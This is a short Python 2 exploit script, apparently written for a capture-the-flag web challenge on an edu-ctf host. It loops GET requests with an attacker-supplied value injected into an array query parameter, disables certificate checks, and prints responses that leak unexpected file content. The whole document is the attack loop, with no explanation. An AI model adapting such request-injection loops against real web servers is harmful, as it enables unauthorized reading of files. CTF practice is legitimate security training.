#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import requests
import urllib3
import sys

urllib3.disable_warnings()

if len(sys.argv) == 2:
    payload = sys.argv[1]
else:
    payload = 'abc'

while True:
    r = requests.get(
            'https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]=' + payload,
            verify=False)
    if '</h2>abc</div>' not in r.text \
            and '<h2>Here is your file content:</h2>' in r.text \
            and '<h2>Here is your file content:</h2></div>' not in r.text:
        print r.text
